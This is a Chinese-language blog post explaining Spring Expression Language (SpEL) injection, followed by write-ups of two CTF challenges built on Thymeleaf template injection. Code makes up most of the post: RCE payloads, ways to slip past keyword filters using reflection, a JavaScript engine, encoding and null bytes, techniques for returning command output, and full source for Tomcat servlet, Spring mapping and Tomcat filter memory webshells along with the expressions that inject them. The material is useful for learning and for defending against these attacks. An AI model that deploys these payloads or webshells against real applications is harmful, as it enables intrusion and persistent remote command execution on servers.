title: SpEL表达式注入漏洞学习
author: bmth
tags:
  - SpEL
categories:
  - java
date: 2023-04-15 05:30:00
top_img: https://img-blog.csdnimg.cn/d7c178195a5744f7a18d89b36c9936c8.png
cover: https://img-blog.csdnimg.cn/d7c178195a5744f7a18d89b36c9936c8.png
---
![](https://img-blog.csdnimg.cn/d7c178195a5744f7a18d89b36c9936c8.png)

## 认识SpEL
Spring Expression Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。语言语法类似于Unified EL，但提供了额外的功能，特别是方法调用和基本的字符串模板功能。同时因为SpEL是以API接口的形式创建的，所以允许将其集成到其他应用程序和框架中

SpEL使用`#{}`作为定界符，所有在大括号中的字符都将被认为是SpEL表达式，在其中可以使用SpEL运算符、变量、引用bean及其属性和方法等
这里需要注意`#{}`和`${}`的区别：
- `#{}`就是SpEL的定界符，用于指明内容为SpEL表达式并执行
- `${}`主要用于加载外部属性文件中的值
- 两者可以混合使用，但是必须`#{}`在外面，`${}`在里面，如`#{'${}'}`，注意单引号是字符串类型才添加的


实验环境：[https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-spel-rce](https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-spel-rce)

可以看到给出的代码：
```java
package code.landgrey.controller;

import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
import org.springframework.expression.Expression;
import org.springframework.expression.common.TemplateParserContext;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
@EnableAutoConfiguration
public class Index {
    @ResponseBody
    @RequestMapping(value = "/index", method = {RequestMethod.GET, RequestMethod.POST})
    public String spel(String input){
        SpelExpressionParser parser = new SpelExpressionParser();
        TemplateParserContext templateParserContext = new TemplateParserContext();
        Expression expression = parser.parseExpression(input,templateParserContext);
        return expression.getValue().toString();
    }
}
```
具体步骤如下：
1. 创建解析器：SpEL 使用 ExpressionParser 接口表示解析器，提供 SpelExpressionParser 默认实现
2. 解析表达式：使用 ExpressionParser 的 parseExpression 来解析相应的表达式为 Expression 对象
3. 构造上下文：准备比如变量定义等等表达式需要的上下文数据
4. 求值：通过 Expression 接口的 getValue 方法根据上下文获得表达式值

漏洞原理：
SimpleEvaluationContext和StandardEvaluationContext是SpEL提供的两个EvaluationContext：
- SimpleEvaluationContext - 针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开SpEL语言特性和配置选项的子集
- StandardEvaluationContext - 公开全套SpEL语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略


在不指定`EvaluationContext`的情况下默认采用的是`StandardEvaluationContext`，而它包含了SpEL的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行

### 类类型表达式T(Type)
SpEL中可以使用特定的Java类型，经常用来访问Java类型中的静态属性或静态方法，需要用`T()`操作符进行声明，括号中需要包含类名的全限定名，也就是包名加上类名，唯一例外的是，SpEL内置了`java.lang`包下的类声明，也就是说`java.lang.String`可以通过`T(String)`访问，而不需要使用全限定名
```java
ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression("T(java.lang.Runtime).getRuntime().exec('calc')");
Object value = exp.getValue();
System.out.println(value);
```


### 类实例化
使用new可以直接在SpEL中创建实例，需要创建实例的类要通过全限定名进行访问
```java
ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression("new java.lang.ProcessBuilder('cmd','/c','calc').start()");
Object value = exp.getValue();
System.out.println(value);
```


### 常用payload与回显
原型：
```java
#{12*12}
#{T(java.lang.Runtime).getRuntime().exec("calc")}
#{new java.lang.ProcessBuilder('cmd','/c','calc').start()}
#{T(Thread).sleep(10000)}
```

**关键字黑名单过滤绕过：**
1.反射调用
```java
#{T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"cmd","/c","calc"})}
```
具体环境可以参考：[Code-Breaking Puzzles — javacon WriteUp](http://rui0.cn/archives/1015)

如果过滤了`.getClass`，也可以使用 `''.class.getSuperclass().class`替代
```java
''.class.getSuperclass().class.forName('java.lang.Runtime').getDeclaredMethods()[14].invoke(''.class.getSuperclass().class.forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),'calc')
```
需要注意，这里的14可能需要替换为15，不同jdk版本的序号不同

2.JavaScript引擎
```java
#{T(javax.script.ScriptEngineManager).newInstance().getEngineByName("nashorn").eval("s=[3];s[0]='cmd';s[1]='/c';s[2]='calc';java.la"+"ng.Run"+"time.getRu"+"ntime().ex"+"ec(s);")}
#{T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval("java.lang.Runtime.getRuntime().exec('calc')"),)}
```
还可以使用URL编码
```java
#{T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval(T(java.net.URLDecoder).decode("%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29")),)}
```
参考：[java中js命令执行的攻与防](https://forum.butian.net/share/487)

绕过`T(`过滤：
```java
#{T%00(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x63,0x61,0x6c,0x63}))}
```
上面的代码在解析字符时，将空格字符和 \u0000 字符当成了空白符号，所以，直接尝试在 T 和 ( 字符中间插入 %00 ，成功绕过

参考：
[bypass openrasp SpEL RCE 的过程及思考](https://landgrey.me/blog/15/)

**回显构造：**

BufferedReader
```java
#{new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder("cmd", "/c", "whoami").start().getInputStream(), "GBK")).readLine()}
```
这种方式缺点很明显，只能读取一行
![](https://img-blog.csdnimg.cn/064aee1e06ae40b5adeab666caf24ac6.png)

Scanner
原理在于`Scanner#useDelimiter`方法使用指定的字符串分割输出，就会让所有的字符都在第一行，然后执行next方法即可获得所有输出
```java
#{new java.util.Scanner(new java.lang.ProcessBuilder("cmd", "/c", "whoami").start().getInputStream(), "GBK").useDelimiter("\\A").next()}
```
![](https://img-blog.csdnimg.cn/4c6c9ee160c74ff6b1df799ec7ea45a2.png)

参考：
[SpEL注入RCE分析与绕过](https://xz.aliyun.com/t/9245)
[SpEL表达式注入漏洞总结](https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/)
[由浅入深SpEL表达式注入漏洞](http://rui0.cn/archives/1043)
[SpEL表达式注入漏洞学习和回显poc研究](https://www.shuzhiduo.com/A/D854NO36zE/)

## 赛题复现
### [2022网鼎杯 玄武组]FindIT
拿到源码，看到Thymeleaf，并且版本是3.0.12
![](https://img-blog.csdnimg.cn/4b1d4182c6e44fc9915bd310448031cd.png)

看到`/doc/{data}`这个路由没有使用`@ResponseBody` 进行注解，因此即使没有return 情况下也是可注入的
在 3.0.12 版本进行了SSTI的修复：[https://github.com/thymeleaf/thymeleaf/issues/809](https://github.com/thymeleaf/thymeleaf/issues/809)
1. 不能让视图的名字和 path 一致
可以使用`//`或者`;/`绕过
2. 表达式中不能含有关键字new
3. 在(的左边的字符不能是T
4. 不能在T和(中间添加的字符使得原表达式出现问题
可以使用%20(空格)、%0a(换行)、%09(制表符)等等进行绕过

参考：
[Thymeleaf SSTI 分析以及最新版修复的 Bypass](https://www.cnpanda.net/sec/1063.html)
最后的payload：
```
/doc//__${T (java.lang.Runtime).getRuntime().exec('calc')}__::.x
/doc;/__${T (java.lang.Runtime).getRuntime().exec('calc')}__::.x
```

下面就是难点了，环境不出网，需要写入内存马，又是get传参，发现 tomcat 会报400和404错误
404：payload 包含了`/`，tomcat 会认为这是一个路径关键字，会找对应的路由，找不到就会报404
400：payload 中包含`[]`等特殊字符

#### 方法一
可以使用ScriptEngine执行代码，使用`#request.getHeader()`进行传参(注意将`#`进行url编码为`%23`)
```java
__${''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName("nashorn").eval(#request.getHeader('cmd'))}__::.x
```
![](https://img-blog.csdnimg.cn/76918fc1cfc04138aa4ca7a1dcd0c75a.png)

可以看到成功执行命令，接下来写一个servlet内存马：
```java
import org.apache.catalina.Wrapper;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import javax.servlet.Servlet;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.util.Scanner;

public class memshell extends HttpServlet {
    static {
        try {
            Servlet servlet = new memshell();
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext context = (StandardContext) webappClassLoaderBase.getResources().getContext();
            String name = memshell.class.getSimpleName();
            Wrapper wrapper = context.createWrapper();
            wrapper.setName(name);
            wrapper.setServlet(servlet);
            context.addChild(wrapper);
            context.addServletMappingDecoded("/shell", name);
        } catch (Exception e) {
        }
    }

    public memshell(){
    }
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String cmd = request.getParameter("cmd");
        if (cmd != null) {
            InputStream in = null;
            ProcessBuilder p;
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                p = new ProcessBuilder(new String[]{"cmd.exe", "/c", cmd});
            } else {
                p = new ProcessBuilder(new String[]{"/bin/sh", "-c", cmd});
            }
            in = p.start().getInputStream();
            Scanner scanner = new Scanner(in).useDelimiter("\\A");
            String out = scanner.hasNext() ? scanner.next() : "";
            response.getWriter().write(out);
            response.getWriter().flush();
        }
    }
}
```
然后将加载字节码的SpEL payload 转成 ScriptEngine形式，即：
```java
${T(org.springframework.cglib.core.ReflectUtils).defineClass('memshell',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAA....'),T(org.springframework.util.ClassUtils).getDefaultClassLoader())}
```
转换为：
```java
var base64 = "yv66vgAAA....";var bytecode = org.springframework.util.Base64Utils.decodeFromString(base64);var classloader = org.springframework.util.ClassUtils.getDefaultClassLoader();var memshell = org.springframework.cglib.core.ReflectUtils.defineClass("memshell",bytecode,classloader).newInstance();
```
最后传入即可
![](https://img-blog.csdnimg.cn/d4c0814c364d4b26b8609c40efd2f603.png)

#### 方法二
使用registerMapping 注册路径为`"/*"`的RequestMapping
![](https://img-blog.csdnimg.cn/fe376b8e2ed744f690eb8766c64e6f78.png)

我们只要把编写的恶意方法executeCommand注册进去就可以了

最后testivy师傅构造的内存马如下：
```java
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;

import java.io.IOException;
import java.lang.reflect.Method;
import java.util.Scanner;

public class SpringRequestMappingMemshell {
    public static String doInject(Object requestMappingHandlerMapping) {
        String msg = "inject-start";
        try {
            Method registerMapping = requestMappingHandlerMapping.getClass().getMethod("registerMapping", Object.class, Object.class, Method.class);
            registerMapping.setAccessible(true);
            Method executeCommand = SpringRequestMappingMemshell.class.getDeclaredMethod("executeCommand", String.class);
            PatternsRequestCondition patternsRequestCondition = new PatternsRequestCondition("/*");
            RequestMethodsRequestCondition methodsRequestCondition = new RequestMethodsRequestCondition();
            RequestMappingInfo requestMappingInfo = new RequestMappingInfo(patternsRequestCondition, methodsRequestCondition, null, null, null, null, null);
            registerMapping.invoke(requestMappingHandlerMapping, requestMappingInfo, new SpringRequestMappingMemshell(), executeCommand);
            msg = "inject-success";
        } catch (Exception e) {
            e.printStackTrace();
            msg = "inject-error";
        }
        return msg;
    }

    public ResponseEntity executeCommand(@RequestParam(value = "cmd") String cmd) throws IOException {
        String execResult = new Scanner(Runtime.getRuntime().exec(new String[]{"cmd","/c",cmd}).getInputStream()).useDelimiter("\\A").next();
        return new ResponseEntity(execResult, HttpStatus.OK);
    }
}
```
接下来就是处理特殊字符
由于thymeleaf 3.0.12 的 containsSpELInstantiationOrStatic 方法过滤了 new 这个关键字，使用nEw大小写绕过检测，`[]`可以url编码为`%5B%5D`，或者直接使用`java.net.URL("http","127.0.0.1","1.txt")`进行替代
从SpEL上下文的bean当中获取RequestMappingHandlerMapping

最后的exp：
```
__${T (org.springframework.cglib.core.ReflectUtils).defineClass("SpringRequestMappingMemshell",T (org.springframework.util.Base64Utils).decodeFromUrlSafeString("yv66vgAAA..."),nEw javax.management.loading.MLet(NeW java.net.URL("http","127.0.0.1","1.txt"),T (java.lang.Thread).currentThread().getContextClassLoader())).doInject(T (org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT",0).getBean(T (Class).forName("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping")))}__::.x
```
![](https://img-blog.csdnimg.cn/5eb1e6a88c5d44beb085fb7dadd0ea3e.png)

请求任意路径都可RCE

参考：
[网鼎CTF之findIT题解—Spring通用MemShell改造 ](https://xz.aliyun.com/t/11688)

### [miniLCTF_2022]mini_springboot
题目地址：[https://github.com/XDSEC/miniLCTF_2022](https://github.com/XDSEC/miniLCTF_2022)
![](https://img-blog.csdnimg.cn/694d5d697d224dfe9029efc65ab747a7.png)

可以看到很明显的Thymeleaf 模板注入，但是存在一个filter过滤器
![](https://img-blog.csdnimg.cn/2023e10eda494691a943a656d8a22281.png)

如果匹配到new或者untime就会直接输出hack，其实可以直接大小写绕过，反射调用等等方法，这里直接ProcessBuilder执行命令
```java
__${New ProcessBuilder("calc").start()}__::.x
```
能执行命令，但没有回显，十分的不方便
我们知道java的最终奥义都是打内存马的，存在Tomcat环境，直接使用Tomcat的Filter内存马
```java
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Map;
import java.util.Scanner;
import javax.servlet.Filter;

public class EvilFilter implements Filter{
    static{
        try {
            final String name = "shell";
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            Field Configs = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("filterConfigs");
            Configs.setAccessible(true);
            Map filterConfigs = (Map) Configs.get(standardContext);

            if (filterConfigs.get(name) == null) {
                Filter filter = new EvilFilter();

                FilterDef filterDef = new FilterDef();
                filterDef.setFilter(filter);
                filterDef.setFilterName(name);
                filterDef.setFilterClass(filter.getClass().getName());

                standardContext.addFilterDef(filterDef);

                FilterMap filterMap = new FilterMap();
                filterMap.addURLPattern("/*");
                filterMap.setFilterName(name);
                filterMap.setDispatcher(DispatcherType.REQUEST.name());

                standardContext.addFilterMapBefore(filterMap);

                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
                constructor.setAccessible(true);
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

                filterConfigs.put(name, filterConfig);
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    @Override
    public void init(FilterConfig filterConfig) throws ServletException{}
    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException,ServletException{
        HttpServletRequest req = (HttpServletRequest) servletRequest;
        if (req.getParameter("cmd") != null){
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", req.getParameter("cmd")} : new String[]{"cmd.exe", "/c", req.getParameter("cmd")};
            InputStream inputStream = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner scanner = new Scanner(inputStream).useDelimiter("\\a");
            String output = scanner.hasNext() ? scanner.next() : "";
            servletResponse.getWriter().write(output);
            servletResponse.getWriter().flush();
            return;
        }
        filterChain.doFilter(servletRequest,servletResponse);
    }
    @Override
    public void destroy() {}
}
```
最后使用ReflectUtils反射调用defineClass
```java
__${T(org.springframework.cglib.core.ReflectUtils).defineClass('EvilFilter',T(org.springframework.util.Base64Utils).decodeFromUrlSafeString('yv66vgAAA....'),T(org.springframework.util.ClassUtils).getDefaultClassLoader())}__::.x
__${T(org.springframework.cglib.core.ReflectUtils).defineClass('EvilFilter',T(com.sun.org.apache.xerces.internal.impl.dv.util.HexBin).decode('CAFEBABE....'),T(org.springframework.util.ClassUtils).getDefaultClassLoader())}__::.x
```
![](https://img-blog.csdnimg.cn/a429c39892a445c38e0278aa37126a6c.png)

参考：
[Thymeleaf SSTI漏洞分析 ](https://xz.aliyun.com/t/10514)
